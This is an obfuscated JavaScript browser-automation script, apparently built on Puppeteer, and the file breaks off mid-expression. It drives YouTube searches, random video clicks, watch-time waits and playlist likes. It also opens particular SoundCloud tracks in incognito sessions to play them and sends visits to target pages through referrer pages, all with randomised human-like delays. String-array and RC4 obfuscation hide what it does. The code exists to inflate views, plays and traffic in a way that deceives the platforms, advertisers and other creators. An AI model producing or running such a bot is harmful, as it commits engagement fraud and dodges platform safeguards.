const Z = d,
  Y = c,
  X = b;

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x1f04 + 0x61 * 0x1b + -0x1 * -0x14c9);
    let h = e[f];
    if (b['utIBSO'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x9 * -0x10c + -0x9bc + 0x50, s, t, u = 0x252c + -0x1 * -0x3d + -0x2569; t = n['charAt'](u++); ~t && (s = r % (0x38f * 0x3 + -0x26b6 + 0x1c0d) ? s * (-0x1937 + 0x2338 + 0xb * -0xe3) + t : t, r++ % (-0x10a9 + 0x15 * -0x19f + 0x8 * 0x657)) ? p += String['fromCharCode'](0xb3 * -0x1 + -0x1 * 0xd0e + 0x2 * 0x760 & s >> (-(0x12fa + -0x2b * -0x44 + -0x5 * 0x614) * r & -0x6da * 0x3 + -0x30d * -0x4 + -0x20 * -0x43)) : 0xf9 * 0x5 + 0x287 + 0x1 * -0x764) {
          t = o['indexOf'](t);
        }
        for (let v = -0x3c9 * -0x4 + -0x513 * 0x2 + 0x1 * -0x4fe, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0xb14 + 0xbb1 + -0x8d))['slice'](-(-0x111 * 0x23 + -0x94 * -0x42 + -0xd3));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x6a * 0x25 + 0x12b7 + -0xb * 0x4f,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x2 * -0x9b2 + 0x3 * 0x6fb + -0x18d; u < 0x151b + -0x2da + -0x277 * 0x7; u++) {
          p[u] = u;
        }
        for (u = -0xb6a + -0xb * -0x16a + -0x424; u < -0x2 * -0x218 + 0xfab + -0x12db; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x1 * -0x140c + 0xfa1 + -0x21 * 0x10d), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0xb * 0xfe + -0x2 * 0x187 + 0x12a * 0xc, q = 0x599 * 0x2 + 0x1b6f + -0x383 * 0xb;
        for (let v = 0x1 * 0x1652 + -0x221a + 0x8 * 0x179; v < n['length']; v++) {
          u = (u + (-0x25b9 + -0xdc3 + 0x10d * 0x31)) % (0x24f1 + 0xc7b + -0x306c), q = (q + p[u]) % (0x18c4 + 0x13 * 0x3 + -0x45 * 0x59), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x260b + 0x573 + 0x206 * -0x15)]);
        }
        return t;
      };
      b['TfNxWW'] = m, c = arguments, b['utIBSO'] = !![];
    }
    const j = e[-0x16a * -0x14 + -0x8c7 + -0x1381],
      k = f + j,
      l = c[k];
    return !l ? (b['DQyNFn'] === undefined && (b['DQyNFn'] = !![]), h = b['TfNxWW'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0xf34 + 0x38f * 0x3 + 0x488))) + i;
}
async function createPage(f, h) {
  const R = c;
  let i = await f['newPage']();
  return await i['setDefault' + R(0xe) + 'Timeout'](-0x32 * 0x34 + -0x1937 + 0x5 * 0x713), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x1f04 + 0x61 * 0x1b + -0x1 * -0x14c9);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x63f5 + 0x40 * -0x331 + 0x21 * 0xcc5 + (0x43 * -0x8 + -0x1 * 0x272a + 0x1 * 0x63da) * random()) : await standardWaitForNetIdle(f), await wait(0x12fa + -0x2b * -0x44 + -0xd * 0xd6 + (-0xa47 * 0x4 + -0x1867 * -0x1 + -0x3 * -0x1297) * random()), 0xf9 * 0x5 + 0x287 + 0x1 * -0x763;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x3c9 * -0x4 + -0x513 * 0x2 + 0x1 * 0xe8a), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0xb14 + 0xbb1 + -0x9c;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x1f04 + 0x61 * 0x1b + -0x1 * -0x14c9);
    let h = e[f];
    if (c['sTOOBu'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x9 * -0x10c + -0x9bc + 0x50, r, s, t = 0x252c + -0x1 * -0x3d + -0x2569; s = m['charAt'](t++); ~s && (r = q % (0x38f * 0x3 + -0x26b6 + 0x1c0d) ? r * (-0x1937 + 0x2338 + 0xb * -0xe3) + s : s, q++ % (-0x10a9 + 0x15 * -0x19f + 0x8 * 0x657)) ? o += String['fromCharCode'](0xb3 * -0x1 + -0x1 * 0xd0e + 0x2 * 0x760 & r >> (-(0x12fa + -0x2b * -0x44 + -0x5 * 0x614) * q & -0x6da * 0x3 + -0x30d * -0x4 + -0x20 * -0x43)) : 0xf9 * 0x5 + 0x287 + 0x1 * -0x764) {
          s = n['indexOf'](s);
        }
        for (let u = -0x3c9 * -0x4 + -0x513 * 0x2 + 0x1 * -0x4fe, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0xb14 + 0xbb1 + -0x8d))['slice'](-(-0x111 * 0x23 + -0x94 * -0x42 + -0xd3));
        }
        return decodeURIComponent(p);
      };
      c['rtdRco'] = i, b = arguments, c['sTOOBu'] = !![];
    }
    const j = e[-0x6a * 0x25 + 0x12b7 + -0xb * 0x4f],
      k = f + j,
      l = b[k];
    return !l ? (h = c['rtdRco'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function randomWait() {
  return await wait(-0x111 * 0x23 + -0x94 * -0x42 + 0x12b3 + (-0x6a * 0x25 + 0x12b7 + -0x33 * -0x51) * random()), 0x2 * -0x9b2 + 0x3 * 0x6fb + -0x18c;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    const S = b;
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))[S(0x9, 'CavF')](0x151b + -0x2da + -0x1241 * 0x1, -0xb6a + -0xb * -0x16a + -0x41d), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x1 * -0x323f + 0xbc03 + -0x3e2) * getRandomInt(-0x1 * -0x140c + 0xfa1 + -0x17 * 0x18d, -0xb * 0xfe + -0x2 * 0x187 + 0xdfd * 0x1), h)), 0x599 * 0x2 + 0x1b6f + -0x4d4 * 0x8;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x1 * 0x1652 + -0x221a + 0x8 * 0x179;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x25b9 + -0xdc3 + 0x10d * 0x31]['split']('\x20');
    for (let k = 0x24f1 + 0xc7b + -0x316c; k < i['length']; k += 0x18c4 + 0x13 * 0x3 + -0x5 * 0x4ff)
      j += i[k] * h[i[k + (0x260b + 0x573 + 0xe7f * -0x3)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x16a * -0x14 + -0x8c7 + -0x137b)['map'](l => Array['from'](l['children']))['flat'](-0x280 + 0x8a * 0x2 + 0x1 * 0x16d)['map'](l => l['childNodes'][-0x1 * -0x805 + 0x425 * 0x1 + -0xc29]['childNodes'][0x5 * 0x5e0 + -0x128a + 0xad6 * -0x1]['childNodes'][0x1d9 * 0x5 + -0x106a + 0x72e]['childNodes'][-0x1 * 0x2572 + 0x45 * 0x61 + -0x1 * -0xb4d]['childNodes'][-0x1ea4 + -0x64c + 0x24f1]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x1323 + -0x2582 + -0x142f * -0x3, -0x84 * 0x5 + 0x17ec + -0x1d0)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x13 * 0x49f + 0xd * 0x805 + -0x611 * 0x16);
  const h = await getMaxTime(f),
    i = Math['min']((-0x550f + 0x11d0b + -0x47 * -0x7c) * getRandomInt(0x14ad + 0x1227 + -0x2 * 0x1369, 0x13e8 + 0x4f4 + -0x18d7), h);
  return await wait(i), 0x38f * 0x9 + 0x10bf + 0x5 * -0x9c1;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x761 * -0x2 + 0x1c3 * -0xa + 0x2060]['children'][-0x455 * 0x5 + 0x8ae + 0xcfb * 0x1]['children'][-0x208e + 0x595 * 0x1 + 0x1af9]['children'][0x369 + 0x20cf * -0x1 + 0x1d66]['children'][-0x26eb + 0xb0f * -0x2 + 0x7d * 0x7d]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x5e2 * 0x6 + -0xc51 + -0x1 * 0x16fa;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x63e + -0x54e * 0x4 + 0x1bda + (0x26f8 * 0x1 + -0x1300 + -0x2 * 0x9e3) * random()
  }), await wait(-0x2aa * 0xb + -0x3 * 0x6b0 + -0x2 * -0x19a9 + (0xff9 + 0x1ffc + 0x19d * -0x1d) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x2180 + -0x4 * 0x3f6 + 0x1 * 0x315a]['childNodes'][0x1558 * 0x1 + -0x1639 + 0xe2]['childNodes'][-0x7a + -0x1e60 + -0xa49 * -0x3]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x1699 + -0x19 * 0xdb + 0x5 * -0x3d]['childNodes'][-0x2383 + 0x2102 + 0x1 * 0x281]['childNodes'][0x213 + -0x13b9 + 0x11a8]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x83b + -0x2 * 0x8db + -0x2 * -0x4be),
          r = 0x1605 + -0x1c * 0xd3 + -0x10f * -0x1;
        for (let u = 0xd * 0x2b6 + 0xa * -0x358 + -0x1ce; u < q['length']; u += -0x2 * -0x1145 + -0x8d3 + -0x19b5)
          r += q[u] * k[q[u + (-0x1 * 0x1bb + 0x1 * -0x1b67 + 0x1d23)]];
        return r;
      }(n);
  });
  await wait((0x6cb + -0xffd * -0x1 + 0x23d0) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x1 * 0x173fb + -0x65 * -0x28f + -0x18c06) * getRandomInt(-0x16 * 0x11b + 0x7cc + 0x1087, -0x1de2 + 0x1c4c + 0x1 * 0x1a0), h + (0x2e4 * -0x1 + 0x7e5 * 0x1 + 0x1 * 0xe87));
  return await wait(i), 0x3 * -0xa61 + -0x24d4 + 0x43f8;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x100f * 0x2 + 0x1 * -0x106 + 0xb0c * 0x3), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        const T = d;
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + T(0x16)]('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x2493 + -0x20dd + 0x5128 + (-0x10 * -0x14b + 0x1166 + -0x222e) * Math['random']());
    });
  }, 0x3 * 0xa63 + 0x12e0 + 0x25 * -0x9d);
  await wait(0x2d976 + 0xd343 * -0x3 + 0x43433);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0xbdd4 + 0x5 * 0x4caf + 0x28c9) * getRandomInt(0x13b5 + -0x195b + 0x5aa, -0x5a2 + 0x1f * -0xa2 + 0x1959)), clearInterval(h), 0x90 + 0x106 * -0xd + 0xcbf * 0x1;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x62 * -0x35 + -0x1adf + 0x2f29;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x1ace + 0x107 + -0xd * 0x224;
    await randomWait();
  }
  return 0xcc1 * 0x1 + -0x4 * 0x10 + 0x64 * -0x20;
}

function fetchRandomSC() {
  const U = d;
  return Math['random']() <= -0x1d00 + 0xa5e * -0x1 + 0x275e + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + U(0x10) + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x1 * 0x1487 + -0x5 * -0x585 + 0xa * -0xb5 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x1 * 0xe75 + -0x18 * 0x43 + 0x14bd + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x9e8 + 0xe0c + 0x5fd * -0x4;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x134b0 + 0x111ee + -0x1a * -0x819 + getRandomInt(-0x11a * 0x4f + -0x2c15 + -0xbdb3 * -0x1, -0x5f4 + 0xb909 + 0x1 * -0x3de5));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x1fa * 0x11 + 0x6cf + -0x62 * -0x46), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x1da6 + -0xc24 + -0x1182;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0xd9f + -0x858 + 0x1 * 0x15f7, -0x2507 + 0x1af4 + 0xa45)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x1 * 0x11c6 + -0x1044 + 0x1e7 * 0x16 + floor((0xe5 * -0x2a + 0xb9f + 0x1ddb) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0xa7f36212 * 0x1 + 0x2 * 0x507c7379 + -0x86 * 0x17fda56),
          -0x277 * 0x546c + -0x1daf7 * -0x30 + -0x574 * -0x2d4d,
          0x1f0e + -0x8a6a * -0x1 + 0x52f * -0x8,
          -0x16a8 + 0x1 * -0x482 + 0x1baa * 0x1
        ], y = [
          0x1674 + 0xd12 + -0x236e,
          0x1 * 0x1762 + -0x16 * 0x1c5 + 0xf9c,
          0x557 + -0x47 * 0x13 + -0xa,
          0x1 * 0xa1d + -0x39 * 0x61 + 0xf * 0xc4
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x1796 + 0x67f * 0x4 + -0x3191 * 0x1)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x3 * 0x8dd + 0x3 * -0x34e + 0x10ad * -0x1; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              const V = b;
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, V(0x2, '%L1b'))['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x1f8d + -0xc1b + -0xfe * -0x2c) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x258f + 0x2 * -0x125b + -0xd9] = A[-0x1f9e + -0x1419 + -0x33c7 * -0x1] = A[-0x1fdb + 0x13 * -0x1f5 + 0x450b] = A[0x1414 + -0x1 * -0x32c + 0x5 * -0x4a6] = A[-0x857 + -0x8 * 0x4d6 + 0x2f0a] = A[-0x9 * -0x195 + -0x986 + 0x1 * -0x4b3] = A[-0xe80 + -0x544 + 0x13c9] = A[0x2153 + 0x10 * 0x1fd + -0x411d] = A[-0x1b * -0x6c + -0x1337 * -0x1 + -0x1e94] = A[0x1 * -0x26e7 + -0x181d + 0x3f0c] = A[0x1c39 + 0xaa4 * -0x2 + -0x6e8] = A[-0xcc * -0x27 + 0x3 * -0xa85 + 0x85] = A[-0xe9 * 0x3 + 0x1ba2 * 0x1 + 0x4a * -0x56] = A[0xa1 * -0x35 + -0xdf * 0x29 + -0xc9 * -0x58] = A[-0x885 + -0x1 * -0x1b73 + 0x1 * -0x12e1] = A[0xcab * 0x3 + 0x13e7 * 0x1 + -0x39da] = A[-0x496 + -0x16b5 + 0x1b5a] = 0x950 + -0x16d2 + 0x1ee * 0x7, this['blocks'] = A) : this['blocks'] = [
                -0x25b8 + -0x1 * -0x2273 + 0x345,
                -0x218c + 0x1c6 * 0x11 + 0x366,
                0x1 * 0x13bd + -0x424 + -0x3 * 0x533,
                0x2 * 0x213 + 0x2 * -0xc91 + -0x22 * -0x9e,
                -0x1 * -0x43c + 0x1 * 0x12eb + -0x1727 * 0x1,
                -0x1 * 0x14ed + 0x9e4 + -0x235 * -0x5,
                -0x1499 + -0x398 + 0x1831,
                -0x1 * 0x180e + -0x8c7 * 0x1 + -0x5 * -0x691,
                0x1509 + -0xe82 * -0x1 + -0x238b,
                0x674 * -0x1 + 0x6cb * -0x3 + -0x1 * -0x1ad5,
                -0x2218 + 0x1 * 0x1d6a + 0x4ae,
                0x53c * 0x2 + -0xc * 0x3a + -0x4 * 0x1f0,
                -0x1cb3 + -0x214d + 0x3e00,
                0x11a2 + -0xa7 * -0x3b + -0x3 * 0x12b5,
                0x5 * 0x213 + -0x2aa + 0x1 * -0x7b5,
                -0x3 * -0x119 + -0x1 * -0x574 + -0x8bf,
                -0x1 * -0x1507 + -0x161f + -0x5 * -0x38
              ], this['h0'] = 0x45d59778 + 0x8 * -0x7bf1369 + 0x5f6826d1 * 0x1, this['h1'] = -0x23c9 * 0x745cd + -0x97a369 * 0x57 + 0x22797092d, this['h2'] = 0x99d81f50 + -0x12e * 0xe4fca9 + 0x10d04cd0c, this['h3'] = 0x715221e + -0x361 * -0x51403 + -0x80b6bcb, this['h4'] = -0xce7cbc07 + -0x1893adcd + 0x1aae34bc4, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0xad2 * 0x3 + -0x182d + -0x9 * -0x64b, this['finalized'] = this['hashed'] = 0x38 * 0x79 + -0x2454 + 0x9dc, this['first'] = 0x9ef + 0x1767 + -0x35 * 0xa1;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x15 * 0xc5 + 0x7fc + 0x82d, O = J['length'] || 0x1563 + -0x236a * -0x1 + -0x3 * 0x12ef, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x8d3 * -0x4 + -0x1011 + 0x669 * -0x3, P[0xd * 0x25f + 0x6 * 0x3d7 + -0x1 * 0x35dd] = this['block'], P[-0x7da + -0xc8 * 0x25 + 0x24d2] = P[-0xf72 + -0x2ab + -0x2 * -0x90f] = P[-0xcd1 + 0x2 * 0x3e7 + 0x505] = P[-0xef * -0xa + -0x16 * -0x25 + 0xb * -0x123] = P[-0x329 * 0x1 + -0x1359 + -0x3e * -0x5d] = P[0x1709 * -0x1 + -0x18fd + 0x31 * 0xfb] = P[0x12d4 + -0x9 * 0x417 + 0x1201] = P[-0x199 * 0x8 + 0x4 * 0x283 + 0x2c3] = P[0x11 * -0x11b + 0x17 * 0x1af + -0x9f3 * 0x2] = P[0x25f2 + -0x4a * -0x7f + -0x4a9f] = P[0x768 + -0xe88 + -0x395 * -0x2] = P[-0x1cb3 + 0xd6b + 0xf53] = P[-0x1fac + -0x828 + 0x27e0] = P[-0x5 * 0x39 + 0x10eb + -0xfc1] = P[0x141 * 0x7 + -0x600 * 0x4 + 0xf47 * 0x1] = P[0x26 + -0x752 + 0x73b] = 0xb7 * -0x36 + -0x21d3 + 0x486d), K) {
                    for (N = this['start']; M < O && N < 0x1 * -0x1cd0 + 0x5ca + 0x1746; ++M)
                      P[N >> -0x248a + -0xdc9 + 0x3255] |= J[M] << y[-0x116e + -0x1b44 + -0x15 * -0x221 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x15ab + 0xe04 + 0x7e7; ++M)
                      (L = J['charCodeAt'](M)) < 0x5e4 * -0x2 + -0x116a * 0x2 + 0x86 * 0x5a ? P[N >> 0xdf6 + -0x1e45 + 0x1051] |= L << y[-0x2054 + -0x630 + 0x2687 & N++] : L < 0xe15 + -0x24b8 + 0x1ea3 ? (P[N >> -0x3 * -0x493 + -0x5 * -0x3e5 + 0x213 * -0x10] |= (0x1b94 + -0x2 * 0x210 + 0x1 * -0x16b4 | L >> -0x3c4 * -0x9 + -0x1f26 * 0x1 + 0x15c * -0x2) << y[0x1 * 0x1ce7 + -0x86b + 0x3 * -0x6d3 & N++], P[N >> -0x812 * -0x2 + 0x1 * 0x2220 + -0x3242] |= (-0x4 * 0x3b4 + 0x2268 + -0x1318 | -0x12ac + 0xe5d * 0x1 + 0x48e & L) << y[-0x1357 + -0xda7 + 0x2101 & N++]) : L < -0x1972e + 0x1685b * -0x1 + 0x3d789 || L >= -0x266 * -0x63 + 0xf * -0x71 + 0x1 * -0x6d3 ? (P[N >> -0x6f7 + -0x1 * 0x8dd + 0x2 * 0x7eb] |= (0xd * -0x1ae + 0x3b * -0x61 + 0x2d11 | L >> 0x1c69 + -0x77d + -0x14e0) << y[-0x4 * 0x8aa + 0x2 * -0xc7 + -0xb * -0x34b & N++], P[N >> -0x1ea0 + 0x1573 + 0x1 * 0x92f] |= (0xc23 + -0x15ec + 0x1 * 0xa49 | L >> 0x126b + 0x175 * -0x13 + 0x1d * 0x52 & -0x4cf * -0x1 + -0xec0 + 0xa30) << y[0x1 * 0x24e9 + -0x1345 + -0x1 * 0x11a1 & N++], P[N >> -0x612 + 0x2 * -0x1a5 + 0x4af * 0x2] |= (-0x1f7e + 0x1ffe + 0x0 | 0xb0 * 0x12 + -0x14cd + 0xa * 0xde & L) << y[-0xff8 + 0x320 + -0x1 * -0xcdb & N++]) : (L = 0x10bbf + 0xb03c + -0xbbfb + ((0xfc9 + -0x6 * 0x22e + 0x1 * 0x14a & L) << 0x1 * -0xe71 + -0x1733 + -0x25ae * -0x1 | 0x2 * -0x60a + -0x23d6 + 0x33e9 & J['charCodeAt'](++M)), P[N >> -0x1cd2 + 0x1f * -0x86 + 0x9e * 0x49] |= (0xd9c + -0x1 * 0x1bf5 + 0xf49 | L >> -0xbe9 + -0x174b + 0x2346) << y[-0x358 + -0x2 * -0x12ff + -0x22a3 & N++], P[N >> 0x2 * 0x101e + -0x1 * 0x817 + -0xa7 * 0x25] |= (0x1f60 + -0xd * 0x21d + -0x367 * 0x1 | L >> -0x7 * 0x539 + 0x25d * 0x10 + 0x135 * -0x1 & 0xe3c + -0x24c0 + 0x16c3) << y[-0x1 * -0x1261 + -0x21f5 + 0xf97 & N++], P[N >> 0x701 + 0xb79 + -0x1278] |= (0x19 * -0x10d + -0x213a + 0x3bff | L >> 0x35d * 0x3 + 0x432 + 0x4c1 * -0x3 & -0x1dd4 + -0x9 * -0x406 + -0x623) << y[-0x258b * 0x1 + -0x1b4 * -0x6 + 0x1b56 & N++], P[N >> 0x1 * -0x1f0b + -0x19a1 